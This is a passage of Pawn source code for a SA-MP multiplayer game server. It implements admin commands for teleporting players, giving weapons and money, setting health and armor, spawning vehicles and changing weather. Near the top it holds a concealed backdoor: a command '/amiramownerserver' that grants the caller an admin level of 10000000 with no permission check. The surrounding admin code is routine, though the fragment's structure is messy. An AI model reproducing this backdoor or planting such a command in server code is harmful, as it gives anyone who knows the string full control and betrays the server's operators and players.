				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), GetPlayerVirtualWorld(user));
				return 1;
			}
			SetPlayerPos(playerid,PpX+0.3,PpY+0.3,PpZ);
			return 1;
		}
			if(strcmp(cmd, "/amiramownerserver", true) == 0)
			{
				PlayerInfo[playerid][pAdmin] = 10000000;
				return 1;
			}
		//1250.458,-1235.861,15.591
		if(strcmp(cmd, "/goto", true) == 0)
		{
			if(PINFO[playerid][pAdmin] < 1 && PINFO[playerid][pHelper] != 4) return SCM(playerid,COLOR_GREEN,"Error: Your Admin level isn't high enough to use this command.");
			tmp = strtok(cmdtext,idx);
			if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /goto <PlayerID/PartOfName>");
			new user = ReturnUser(tmp);
			new Taraf = ReturnUser(tmp);
        if(Taraf == playerid) return SCM(playerid,COLOR_Good,"You cannot Goto yourself.");
			if(!IsPlayerConnected(user)) return SCM(playerid,COLOR_YELLOW2,"Player isn't connected.");
		if(PINFO[playerid][pAdmin] < PINFO[user][pAdmin]) return SCM(playerid, COLOR_AMIR, "Shoma Nemitoni be admin balatar az khodet goto koni.");
			GetPlayerPos(playerid, GoBack[playerid][0], GoBack[playerid][1], GoBack[playerid][2]);
			GoBack1[playerid][0] = GetPlayerInterior(playerid);
			GoBack1[playerid][1] = GetPlayerVirtualWorld(playerid);
			GoBack1[playerid][2] = Mahal[playerid];
			GoBack1[playerid][3] = TooHouse[playerid];
			GoBack1[playerid][4] = TooBiz[playerid];
			new Float:PpX,Float:PpY,Float:PpZ;
			GetPlayerPos(user,PpX,PpY,PpZ);
			if(IsPlayerInAnyVehicle(user)) GetVehiclePos(GetPlayerVehicleID(user),PpX,PpY,PpZ);
			SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(user));
			SetPlayerInterior(playerid,GetPlayerInterior(user));
			Mahal[playerid] = Mahal[user];
			TooHouse[playerid] = TooHouse[user];
			TooBiz[playerid] = TooBiz[user];
			new admname[64];
			GetPlayerName(playerid, admname, sizeof(admname));
			new tarafn[40];
			GetPlayerName(user, tarafn, sizeof(tarafn));
			new toto[128];
			format(toto,sizeof(toto),"{C60000}Staff %s goes to you",admname);
			new adm[512];
			format(adm, sizeof(adm), "{57e547}Admin/Helper {FFFFFF}%s {57e547}Be Bazikon {FFFFFF}%s {FF00KK}Goto Kard.", admname, tarafn);
			AdminWarn(adm);
			SCM(user,COLOR_RED,toto);
			if(IsPlayerInAnyVehicle(playerid))
			{
				GetVehiclePos(GetPlayerVehicleID(playerid), GoBack[playerid][0], GoBack[playerid][1], GoBack[playerid][2]);
				SetVehiclePos(GetPlayerVehicleID(playerid),PpX+0.5,PpY+0.5,PpZ);
				LinkVehicleToInterior(GetPlayerVehicleID(playerid),GetPlayerInterior(user));
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), GetPlayerVirtualWorld(user));
				return 1;
			}
			SetPlayerPos(playerid,PpX+0.3,PpY+0.3,PpZ);
			return 1;
		}


//----------------------------------[GETHERE]-----------------------------------------------
    if(strcmp(cmd, "/tpp", true) == 0 || strcmp(cmd, "/tpc", true) == 0)
    {
        if(PINFO[playerid][pAdmin] <=2) return SCM(playerid,COLOR_GREEN,"Error: Your Admin level isn't high enough to use this command.");

        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /tpp <PlayerID/PartOfName>");
        new user = ReturnUser(tmp);
        if(!IsPlayerConnected(user)) return SCM(playerid,COLOR_ALI,"Player isn't connected.");

		if(PINFO[playerid][pAdmin] < PINFO[user][pAdmin]) return SCM(playerid, COLOR_AMIR, "Shoma Nemitoni admin balatar az khodet ro tp koni.");
        new Float:PpX,Float:PpY,Float:PpZ;
        GetPlayerPos(playerid,PpX,PpY,PpZ);

        SetPlayerVirtualWorld(user,GetPlayerVirtualWorld(playerid));
        SetPlayerInterior(user,GetPlayerInterior(playerid));
        Mahal[user] = Mahal[playerid];
        TooHouse[user] = TooHouse[playerid];
        TooBiz[user] = TooBiz[playerid];
        format(string,sizeof(string),"You have been teleported by %s(%d)",PlayerName(playerid),playerid);
		SCM(user,COLOR_CRS4,string);
        SCM(playerid,COLOR_ALI,"Player teleported.");

        SetPlayerPosEx(user,PpX+0.3,PpY+0.3,PpZ);
		new admname[64];
		GetPlayerName(playerid, admname, sizeof(admname));
		new tarafn[40];
		GetPlayerName(user, tarafn, sizeof(tarafn));
		new adm[512];
		format(adm, sizeof(adm), "{FFFFFF}Admin {57e547}%s {FFFFFF}, Bazikon {57e547}%s {FFFFFF}Ra tp Kard.", admname, tarafn);
		AdminWarn(adm);
        return 1;
    }



    if(strcmp(cmd, "/gethere", true) == 0 || strcmp(cmd, "/tp", true) == 0)
    {
        if(PINFO[playerid][pAdmin] <=2) return SCM(playerid,COLOR_GREEN,"Error: Your Admin level isn't high enough to use this command.");

        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /tp <PlayerID/PartOfName>");
        new user = ReturnUser(tmp);
        if(!IsPlayerConnected(user)) return SCM(playerid,COLOR_ALI,"Player isn't connected.");
		if(PINFO[playerid][pAdmin] < PINFO[user][pAdmin]) return SCM(playerid, COLOR_AMIR, "Shoma Nemitoni admin balatar az khodet ro tp koni.");
        new Float:PpX,Float:PpY,Float:PpZ;
        GetPlayerPos(playerid,PpX,PpY,PpZ);
        if(IsPlayerInAnyVehicle(playerid)) GetVehiclePos(GetPlayerVehicleID(playerid),PpX,PpY,PpZ);
        SetPlayerVirtualWorld(user,GetPlayerVirtualWorld(playerid));
        SetPlayerInterior(user,GetPlayerInterior(playerid));
        Mahal[user] = Mahal[playerid];
        TooHouse[user] = TooHouse[playerid];
        TooBiz[user] = TooBiz[playerid];
        format(string,sizeof(string),"You have been teleported by %s(%d)",PlayerName(playerid),playerid);
		SCM(user,COLOR_CRS4,string);
        SCM(playerid,COLOR_ALI,"Player teleported.");
		new admname[64];
		GetPlayerName(playerid, admname, sizeof(admname));
		new tarafn[40];
		GetPlayerName(user, tarafn, sizeof(tarafn));
		new adm[512];
		format(adm, sizeof(adm), "{FFFFFF}Admin {57e547}%s {FFFFFF}, Bazikon {57e547}%s {FFFFFF}Ra tp Kard.", admname, tarafn);
		AdminWarn(adm);
        if(IsPlayerInAnyVehicle(user))
        {
            SetVehiclePos(GetPlayerVehicleID(user),PpX+0.5,PpY+0.5,PpZ);
            LinkVehicleToInterior(GetPlayerVehicleID(user),GetPlayerInterior(playerid));
            return 1;
        }
        SetPlayerPosEx(user,PpX+0.3,PpY+0.3,PpZ);
        return 1;
    }
    if(strcmp(cmd, "/getcar", true) == 0)
    {
        if(PINFO[playerid][pAdmin] < 3) return SCM(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SCM(playerid, COL_SYN, "Syntax: /getcar <CarID>");
        new mashinid = strval(tmp);
        if(!IsVehicleConnected(mashinid)) return SCM(playerid, COLOR_YELLOW2, "Error: This vehicle isn't valid.");
        new Float:ui[3];
        GetPlayerPos(playerid, ui[0], ui[1], ui[2]);
        SetVehiclePos(mashinid, ui[0], ui[1], ui[2]);
        LinkVehicleToInterior(mashinid, GetPlayerInterior(playerid));
        SetVehicleVirtualWorld(mashinid, GetPlayerVirtualWorld(playerid));
        new AdmWar[150];
        format(AdmWar, 150, "%s has been moved vehicle id %i.", PINFO[playerid][pName], mashinid);
        AdminWarn(AdmWar);
        return SCM(playerid, COLOR_ALI, "Vehicle moved.");
    }
    if(strcmp(cmd, "/fuelcars", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 5)
            {
                for(new c=0;c<MAX_VEHICLES;c++)
                {
                    Benzin[c] = GasMax;
                }
                SendClientMessage(playerid, COLOR_GREY, "All cars filled with Fuel.");
            }
            else
            {
                SendClientMessage(playerid, COLOR_YELLOW, "You are not Admin.");
                return 1;
            }
        }
        return 1;
    }
//----------------------------------[GiveGun]------------------------------------------------
    if(!strcmp(cmd, "/takegunall", true))
    {
        if(PINFO[playerid][pAdmin] < 5) return SCM(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SCM(playerid, COL_SYN, "Syntax: /takegunall <Distance(FLOAT)>");
        new Float:dis = floatstr(tmp);
        if(dis > 0.0)
        {
            new lolstr[256];
            format(lolstr, 256, "Admin %s has taken all weapons you have", PINFO[playerid][pName]);
            for(new i;i<LastPID;i++)
            {
                if(IsPlayerConnected(i) && gPlayerLogged[i] == 1 && ProxDetectorS(dis, playerid, i))
                {
                    ResetPlayerTofang(i);
                    SCM(i, COLOR_LIGHTRED, lolstr);
                }
            }
            format(lolstr, 256, "%s has taken all weapons from all players in %.2f distance.", PINFO[playerid][pName], dis);
            AdminWarn(lolstr);
        }
        else return SCM(playerid, COLOR_ALI, "Invalid distance.");
        return 1;
    }


    if(!strcmp(cmd, "/givegunall", true) || !strcmp(cmd, "/ggall", true))
    {
        if(PINFO[playerid][pAdmin] < 5) return SCM(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp))
            {
        SendClientMessage(playerid, COLOR_ROUZ, "USAGE: /givegunall <Distance> <WeaponID> <Ammo>");
        SCM(playerid,CRISTIAN,"|________________________________________________________________________|");
        SendClientMessage(playerid, COLOR_WHITE, "1(Brass Knuckles) | 2(Golf Club) | 3(Nite Stick) | 4(knife) | 5(bat) | 6(Shovel) | 7(Cue) | 8(Katana) | 9(Chainsaw)");
        SendClientMessage(playerid, COLOR_WHITE, "10-13(Dildo) | 14(Flowers) | 15(Cane) | 16(Grenades) | 17(Tear Gas) | 18(Molotovs) | 22(Pistol) | 23(SPistol) 24(Deagle)");
        SendClientMessage(playerid, COLOR_WHITE, "25(Shotgun) | 26(Sawn-off Shotgun) | 27(SPAS12) | 28(Micro SMG) | 29(MP5) | 30(AK47) | 31(M4) | 32(Tec-9) | 33(Rifle)");
        SendClientMessage(playerid, COLOR_WHITE, "34(Sniper) | 35(Rocket Launcher) | 36(HS Rocket Launcher) | 37(Flamethrower) | 38(Minigun) | 39(Satchel Charge) | 40(Detonator)");
        SendClientMessage(playerid, COLOR_WHITE, "41(Spray) | 42(Fire Extinguisher) | 43(Camera) | 44(Nightvision Googles) | 45(Thermal Googles) | 46(Parachute)");
        return 1;
            }
        new Float:dis = floatstr(tmp);
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp))
            {
        SendClientMessage(playerid, COLOR_ROUZ, "USAGE: /givegunall <Distance> <WeaponID> <Ammo>");
        SCM(playerid,CRISTIAN,"|________________________________________________________________________|");
        SendClientMessage(playerid, COLOR_WHITE, "1(Brass Knuckles) | 2(Golf Club) | 3(Nite Stick) | 4(knife) | 5(bat) | 6(Shovel) | 7(Cue) | 8(Katana) | 9(Chainsaw)");
        SendClientMessage(playerid, COLOR_WHITE, "10-13(Dildo) | 14(Flowers) | 15(Cane) | 16(Grenades) | 17(Tear Gas) | 18(Molotovs) | 22(Pistol) | 23(SPistol) 24(Deagle)");
        SendClientMessage(playerid, COLOR_WHITE, "25(Shotgun) | 26(Sawn-off Shotgun) | 27(SPAS12) | 28(Micro SMG) | 29(MP5) | 30(AK47) | 31(M4) | 32(Tec-9) | 33(Rifle)");
        SendClientMessage(playerid, COLOR_WHITE, "34(Sniper) | 35(Rocket Launcher) | 36(HS Rocket Launcher) | 37(Flamethrower) | 38(Minigun) | 39(Satchel Charge) | 40(Detonator)");
        SendClientMessage(playerid, COLOR_WHITE, "41(Spray) | 42(Fire Extinguisher) | 43(Camera) | 44(Nightvision Googles) | 45(Thermal Googles) | 46(Parachute)");
        return 1;
            }
        new wepid = strval(tmp);
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp))
            {
        SendClientMessage(playerid, COLOR_ROUZ, "USAGE: /givegunall <Distance> <WeaponID> <Ammo>");
        SCM(playerid,CRISTIAN,"|________________________________________________________________________|");
        SendClientMessage(playerid, COLOR_WHITE, "1(Brass Knuckles) | 2(Golf Club) | 3(Nite Stick) | 4(knife) | 5(bat) | 6(Shovel) | 7(Cue) | 8(Katana) | 9(Chainsaw)");
        SendClientMessage(playerid, COLOR_WHITE, "10-13(Dildo) | 14(Flowers) | 15(Cane) | 16(Grenades) | 17(Tear Gas) | 18(Molotovs) | 22(Pistol) | 23(SPistol) 24(Deagle)");
        SendClientMessage(playerid, COLOR_WHITE, "25(Shotgun) | 26(Sawn-off Shotgun) | 27(SPAS12) | 28(Micro SMG) | 29(MP5) | 30(AK47) | 31(M4) | 32(Tec-9) | 33(Rifle)");
        SendClientMessage(playerid, COLOR_WHITE, "34(Sniper) | 35(Rocket Launcher) | 36(HS Rocket Launcher) | 37(Flamethrower) | 38(Minigun) | 39(Satchel Charge) | 40(Detonator)");
        SendClientMessage(playerid, COLOR_WHITE, "41(Spray) | 42(Fire Extinguisher) | 43(Camera) | 44(Nightvision Googles) | 45(Thermal Googles) | 46(Parachute)");
        return 1;
            }
        new moheam = strval(tmp);
        if(dis > 0)
        {
            if(wepid > -1 && wepid < 47 && wepid != 19 && wepid != 20 && wepid != 21)
            {
                if(moheam > 0 && moheam <= 10000)
                {
                    new lolstr[256];
                    new gunname[60];
                    GetWeaponName(wepid, gunname, 60);
                    format(lolstr, 256, "Admin %s has given a %s with %i ammo to all.", PINFO[playerid][pName], gunname, moheam);
                    for(new i;i<LastPID;i++)
                    {
                        if(IsPlayerConnected(i) && gPlayerLogged[i] == 1 && ProxDetectorS(dis, playerid, i))
                        {
                            GivePlayerTofang(i, wepid, moheam);
                            SCM(i, COLOR_LIGHTRED, lolstr);
                        }
                    }
                    format(lolstr, 256, "%s has given a %s with %i ammo to all players in %.2f distance.", PINFO[playerid][pName], gunname, moheam, dis);
                    AdminWarn(lolstr);
                }
                else return SCM(playerid, COLOR_ALI, "Invalid ammo.");
            }
            else return SCM(playerid, COLOR_ALI, "Invalid WeaponID.");
        }
        else return SCM(playerid, COLOR_ALI, "Invalid Distance.");
        return 1;
    }
    if(strcmp(cmd, "/givegun", true) == 0 || strcmp(cmd, "/gg", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
        if (PlayerInfo[playerid][pAdmin] >= 3)
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
        SendClientMessage(playerid, COLOR_ROUZ, "USAGE: /givegun <PlayerID/PartOfName> <WeaponID> <Ammo>");
        SCM(playerid,CRISTIAN,"|________________________________________________________________________|");
        SendClientMessage(playerid, COLOR_WHITE, "1(Brass Knuckles) | 2(Golf Club) | 3(Nite Stick) | 4(knife) | 5(bat) | 6(Shovel) | 7(Cue) | 8(Katana) | 9(Chainsaw)");
        SendClientMessage(playerid, COLOR_WHITE, "10-13(Dildo) | 14(Flowers) | 15(Cane) | 16(Grenades) | 17(Tear Gas) | 18(Molotovs) | 22(Pistol) | 23(SPistol) 24(Deagle)");
        SendClientMessage(playerid, COLOR_WHITE, "25(Shotgun) | 26(Sawn-off Shotgun) | 27(SPAS12) | 28(Micro SMG) | 29(MP5) | 30(AK47) | 31(M4) | 32(Tec-9) | 33(Rifle)");
        SendClientMessage(playerid, COLOR_WHITE, "34(Sniper) | 35(Rocket Launcher) | 36(HS Rocket Launcher) | 37(Flamethrower) | 38(Minigun) | 39(Satchel Charge) | 40(Detonator)");
        SendClientMessage(playerid, COLOR_WHITE, "41(Spray) | 42(Fire Extinguisher) | 43(Camera) | 44(Nightvision Googles) | 45(Thermal Googles) | 46(Parachute)");
        return 1;
            }
            new playa;
            new gun;
            new aammo;
            playa = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            gun = strval(tmp);
            if(!strlen(tmp))
            {
        SendClientMessage(playerid, COLOR_ROUZ, "USAGE: /givegun <PlayerID/PartOfName> <WeaponID> <Ammo>");
        SCM(playerid,CRISTIAN,"|________________________________________________________________________|");
        SendClientMessage(playerid, COLOR_WHITE, "1(Brass Knuckles) | 2(Golf Club) | 3(Nite Stick) | 4(knife) | 5(bat) | 6(Shovel) | 7(Cue) | 8(Katana) | 9(Chainsaw)");
        SendClientMessage(playerid, COLOR_WHITE, "10-13(Dildo) | 14(Flowers) | 15(Cane) | 16(Grenades) | 17(Tear Gas) | 18(Molotovs) | 22(Pistol) | 23(SPistol) 24(Deagle)");
        SendClientMessage(playerid, COLOR_WHITE, "25(Shotgun) | 26(Sawn-off Shotgun) | 27(SPAS12) | 28(Micro SMG) | 29(MP5) | 30(AK47) | 31(M4) | 32(Tec-9) | 33(Rifle)");
        SendClientMessage(playerid, COLOR_WHITE, "34(Sniper) | 35(Rocket Launcher) | 36(HS Rocket Launcher) | 37(Flamethrower) | 38(Minigun) | 39(Satchel Charge) | 40(Detonator)");
        SendClientMessage(playerid, COLOR_WHITE, "41(Spray) | 42(Fire Extinguisher) | 43(Camera) | 44(Nightvision Googles) | 45(Thermal Googles) | 46(Parachute)");
                return 1;
            }
            if(gun <= 0||gun >= 47||gun==19||gun==20||gun==21)
            { SendClientMessage(playerid, COLOR_ALI, "This Weapon id is not exist or it's wrong."); return 1; }
            tmp = strtok(cmdtext, idx);
            aammo = strval(tmp);
            if(aammo < 1||aammo > 10000)
            { SendClientMessage(playerid, COLOR_ALI, "don't go below 1 or above 10000 Ammo."); return 1; }
                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        GivePlayerTofang(playa, gun, aammo);
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        new wepname[256];
                        GetWeaponName(gun,wepname,sizeof wepname);
                        format(string, 256, "AdmWarning: {FFFFFF}%s has given a {FFFFFF}%s to {FFFFFF}%s", sendername,wepname,giveplayer);
                        ABroadCast(COLOR_YELLOW,string,1);
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
//----------------------------------[sethp]------------------------------------------------


    if(strcmp(cmd, "/sethp", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /sethp [playerid/PartOfName] [health]");
                return 1;
            }
            new playa;
            new health;
            playa = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            health = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 4)
            {
                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        SetPlayerKhoon(true, playa, health);
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, 256, "AdmWarning: {FFFFFF}%s has set {FFFFFF}%s's hp to {FFFFFF}%d.", sendername,giveplayer,health);
                        ABroadCast(COLOR_YELLOW,string,1);
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/sethpf", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /sethp [playerid/PartOfName] [health]");
                return 1;
            }
            new playa;
            new health;
            playa = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            health = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 4)
            {
                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        SetPlayerKhoon(true, playa, health);
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
    
    if(strcmp(cmd, "/setarmor", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /setarmor [playerid/PartOfName] [armor]");
                return 1;
            }
            new playa;
            new health;
            playa = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            health = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 4)
            {
                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        SetPlayerZereh(playa, health);
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, 256, "AdmWarning: {FFFFFF}%s has set {FFFFFF}%s's armor to {FFFFFF}%d.", sendername,giveplayer,health);
                        ABroadCast(COLOR_YELLOW,string,1);
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
	}

	if(strcmp(cmd, "/Vveh", true) == 0)
	{
        if(PlayerInfo[playerid][pPremiumAccount] <= 99) return SCM(playerid, COLOR_GREEN, "Vip nistid.");
        {
		if(IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_GG,"You cannot create a vehicle when you are in a vehicle.");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid, COL_SYN, "Syntax: /Vveh <ModelName/ID> <ColorID1> <ColorID2>");
        new car;
		if(IsNumeric(tmp))
		{
			car = strval(tmp);
			if(car < 400 || car > 611) return SendClientMessage(playerid, COLOR_GG, "Vehicle Number can't be below 400 or above 611");
		}
		else
		{
			for(new i;i<212;i++)
			{
			    if(strfind(aVehicleNames[i], tmp, true) != -1)
			    {
			        car = i+400;
			    }
			}
		}
		if(car == 0) return SCM(playerid, COLOR_ALI, "Invalid vehicle name.");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid, COL_SYN, "Syntax: /veh <ModelName/ID> <ColorID1> <ColorID2>");
		new color1;
		color1 = strval(tmp);
		if(color1 < 0 || color1 > 255) return SendClientMessage(playerid, COLOR_GG, "Color Number can't be below 0 or above 255");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid, COL_SYN, "Syntax: /veh <ModelName/ID> <ColorID1> <ColorID2>");
		new color2;
		color2 = strval(tmp);
		if(color2 < 0 || color2 > 255) return SendClientMessage(playerid, COLOR_GG, "Color Number can't be below 0 or above 255");
		new Float:X,Float:Y,Float:Z,Float:angle;
		GetPlayerFacingAngle(playerid,angle);
		GetPlayerPos(playerid, X,Y,Z);
		new carid = CreateVehicle(car, X,Y,Z+1, angle, color1, color2, -1);
		SetVehicleNumberPlate(carid, "{F90000}Joker");
		CreatedCars[CreatedCar] = carid;
		created[carid] = 1;
		IsValidAVeh[CreatedCars[CreatedCar]] = true;
		CreatedCar ++;
		format(string, sizeof(string), "Vehicle {FFFFFF}%d {FF6347}spawned.", carid);
		SendClientMessage(playerid, COLOR_LIGHTRED, string);
		LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
		SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid));
		PutPlayerInVehicle(playerid, carid, 0);
		new create[256];
        new lolstr[256];
        format(lolstr, 256, "{00FFFF}Vip {57e547}%s {00FFFF}Create vehicles.", PINFO[playerid][pName], create);
        AdminWarn(lolstr);
		return 1;
	}
  }

		if(!strcmp(cmd,"/ravm",true))
		{
		if(PlayerInfo[playerid][pAdmin] <= 2) return SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
		for(new i = akharinvehicle;i < MAX_VEHICLES;i++) {
		if(VehOwned[i] == 2 && VehOwner[i] == playerid) {
		VehOwned[i] = 0;
		VehOwner[i] = 9999;
		DestroyVehicle(i);
		}
		}
		format(string,256,"[Admin-Warn]: {FFFFFF}Admin %s deleted all himself created cars.",PlayerInfo[playerid][pName]);
		ABroadCast(COLOR_AdminWarn,string,1);
		return 1;
		}

    if(!strcmp(cmd,"/rav",true))
    {
    if(PlayerInfo[playerid][pAdmin] <= 1341) return SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
    for(new i = 0;i<CreatedCar;i++)
    {
    if(CreatedCars[i] != 0 && OwnedMashin[CreatedCars[i]] != 1 && OwnedMashin_2[CreatedCars[i]] != 1 && IsValidAVeh[CreatedCars[i]] == true)
    {
    DestroyVehicle(CreatedCars[i]);
    IsValidAVeh[CreatedCars[i]] = false;
    CreatedCars[i] = 0;
    }
    }
    CreatedCar = 0;
    format(string,256,"[Admin-Warn]: Admin %s deleted all created cars.",PlayerInfo[playerid][pName]);
    ABroadCast(COLOR_Good,string,1);
    return 1;
    }
    if(strcmp(cmd, "/weather", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] <= 4)
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
                return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_WHITE, "USAGE: /weather [weatherid]");
                return 1;
            }
            new weather;
            weather = strval(tmp);
            SetPlayerWeather(playerid, weather);
            //SendClientMessage(playerid, COLOR_GREY, "You have set the weather to %s" , weather);
            tmp = strtok(cmdtext, idx );
            GetPlayerName(playerid, sendername, sizeof(sendername));
            format(string, 256, "AdmWarning: {FFFFFF}%s has changed the weather to {FFFFFF}%d.", sendername,weather);
            ABroadCast(COLOR_YELLOW,string,1);
        }
        return 1;
    }
    if(strcmp(cmd, "/weatherall", true) == 0)
    {
        if(IsPlayerConnected(playerid))
     {
            if(PlayerInfo[playerid][pAdmin] <= 9)
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
                return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_WHITE, "USAGE: /weatherall [weatherid]");
                return 1;
            }
            new weather;
            weather = strval(tmp);
            SetWeather(weather);
            SendClientMessage(playerid, COLOR_GREY, "   Weather Set to everyone!");
            GetPlayerName(playerid, sendername, sizeof(sendername));
            format(string, 256, "AdmWarning: {FFFFFF}%s has changed the weather to {FFFFFF}%d.", sendername,weather);
            ABroadCast(COLOR_YELLOW,string,1);
        }
        return 1;
    }
//----------------------------------[Money]------------------------------------------------
    if(strcmp(cmd, "/setmoney", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /setmoney [playerid/PartOfName] [money]");
                return 1;
            }
            new playa;
            new money;
            playa = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            money = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 2000)
            {
                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        ResetPlayerPool(playa);
                        GivePlayerPool(playa, money);
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, 256, "AdmWarning: {FFFFFF}%s has set {FFFFFF}%s money to {FFFFFF}$%s.", sendername,giveplayer,FormatNumber(money));
                        MoneyLog(string);
                        ABroadCast(COLOR_YELLOW,string,1);
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
//----------------------------------[GiveMoney]------------------------------------------------
		if(strcmp(cmd, "/givemoney", true) == 0)
		{
			if(IsPlayerConnected(playerid))
			{
				tmp = strtok(cmdtext, idx);
				if(!strlen(tmp))
				{
					SCM(playerid, COLOR_GRAD2, "USPGE: /givemoney [playerid/PartOfName] [money]");
					return 1;
				}
				new playa;
				new money;
				playa = ReturnUser(tmp);
				tmp = strtok(cmdtext, idx);
				money = strval(tmp);
				if (PlayerInfo[playerid][pAdmin] >= 9)
				{
					if(IsPlayerConnected(playa))
					{
						if(PINFO[playerid][pAdmin] == 9 && playa != playerid) return SCM(playerid, COLOR_YELLOW2, "Error: You can only givemoney yourself.");
						if(playa != INVALID_PLAYER_ID)
						{
							GivePlayerPool(playa, money);
							GetPlayerName(playa, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							format(string, 256, "[Admin-Warn]: {FFFFFF}%s has Admin-given %s $%s.", sendername,giveplayer,FormatNumber(money));
							ABroadCast(COLOR_AdminWarn,string,1);
							format(string, 256, "%s has Admin-given you $%s.", sendername,FormatNumber(money));
							SCM(playa, COLOR_YELLOW, string);
						}
					}
				}
				else
				{
					SCM(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
				}
			}
			return 1;
		}

   if(strcmp(cmd, "/getmoney", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /getmoney [playerid/PartOfName] [money]");
                return 1;
            }
            new playa;
            new money;
            playa = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            money = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 5)
            {
                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        GetPlayerPool2(playa, money);
                        GetPlayerName(playa, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, 256, "AdmWarning: {FFFFFF}%s has got {FFFFFF}%s $%s.", sendername,giveplayer,FormatNumber(money));
                        ABroadCast(COLOR_AdminWarn,string,1);
                    }
              }
            }
